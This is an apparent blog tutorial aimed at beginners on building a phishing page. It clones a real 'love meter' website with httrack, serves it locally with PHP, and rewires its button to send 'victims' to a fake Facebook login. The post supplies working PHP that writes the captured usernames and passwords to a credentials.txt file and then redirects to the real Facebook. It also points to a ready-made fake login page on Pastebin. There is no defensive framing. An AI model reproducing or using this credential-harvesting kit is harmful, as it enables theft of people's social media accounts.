---
layout: post
title: Create Our Own Phising Page
cover-img: "/assets/img/2021/2021-04-01/cover-1.jpeg"
tags: [hack, termux, phising]
---
As a noob if you are having hard time to create your own phising page then this guide is only for you :)

### Requirements :
- Termux Or Any Linux (I am using Termux)
- Some basics knowledge of commands
- Common sense

### Steps :
1. First of all you will have to install a package `httrack`.
```bash
apt install httrack
```
2. Ok lets choose our favorite webpage from internet or google. For example i searched a keyword "lovemeter" on google and got some cool results.

    <img src="/assets/img/2021/2021-04-01/01.jpg" width="90%">  
3. Then i opened very first result and saw very beautiful receipie for my Dish **Phising**.
    <img src="/assets/img/2021/2021-04-01/02.jpg" width="90%">
4. Ok i love it and copied URL & now want to clone it for my phising business so now it's time to use my weapon **httrack**. Here is simple command to clone my desired webpage 

    ```bash
    httrack https://www.prokerala.com/entertainment/love-meter/
    ```
well done httrack! i just got a new folder with name **www.prokerala.com** where all html files cloned. See what i got in my current directory. ( Note that your cloned website is only placed in **www.prokerala.com** folder , rest all things are related to httrack's own purpose )

    <img src="/assets/img/2021/2021-04-01/03.jpg" width="90%">
5. Now just run a local server to serve our new cloned website , well i am using php here but you can use whatever you like for hosting our site. In case you don't have **php** installed then just do `apt install php`

    ```bash
    # -n means no special configuration files used
    # -S <addr>:<port> ; will serve the index.html file from current directory
    cd www.prokerala.com/entertainment/love-meter
    php -n -S 127.0.0.1:8080
    ``` 

6. Now navigate to `http://127.0.0.1:8080` and you will see like this
    <img src="/assets/img/2021/2021-04-01/04.jpg" width="90%">

7. Ok all looks good but now i want that when my victim will click on **Calculate Love %** button, he will be redirected to my second phising page ( that phising page can be Facebook login , Instagram Login or Any Login Page ). Let's change behaviour of Button. Well we can see that button is a submit button of `<form>` element. I just searched for a keyword **Calculate Love %** in `index.html` file and after some scrolling i saw `<form>` element with `action=...`
    <img src="/assets/img/2021/2021-04-01/05.jpg" width="90%">
Just change the `action` value to any valid html or php file like `action="fblogin.html"` and yes make sure there is a file `fblogin.html` in same directory as cloned site. Then after pressing button , he will be redirected to `http://127.0.0.1:8080/fblogin.html` where `fblogin.html` is your fake Facebook Login Page ( You can clone facebook too )

### Some Tips :
* After cloning any social Login Page you can search for a word `action=` where you can change the value of `action`. Here is my php code i saved it with name `login.php` and edited **action** to `action="/login.php"` in my cloned Facebook ( everything is in same directory ).
```php
<?php                                                  
    if (isset($_POST['login'])) {                      
        $email = $_POST['uname'];                      
        $pass = $_POST['pwd'];                         
        $fp = fopen('credentials.txt', 'a');
        fwrite($fp, " ".$email.' = ');
        fwrite($fp, $pass." ");
        fclose($fp);                                   
        ?>
        <script>window.alert('Bhadhayi ho tumhe pyar ho gya hai 100%');
        </script>
        <script>window.location="https://facebook.com";</script> 
<?php                                                  
    }                                                   ?>
```
After login a new file will be created with name `credentials.txt` where credentials will be saved. Well i am also giving my Facebook login page on [Pastebin](https://pastebin.com/tEQHSLtv) which is a single All-In-One file.

* You can always adjust depthness of cloning by using flag `--depth=N` where `N` is level of depthness. Why we need this ? Well fortunately the website i cloned was simple and contains html files but what when website contains many external CSS files for styling ? then you will have to adjust depthness of cloning to clone **CSS** files , assets like images etc. We need this option also when we don't want to clone whole website but only some portion of it. The higher number `N` , the more deep cloning will be done.

    ```bash
    httrack --depth=1 https://wwww.website.com/ 
    ```
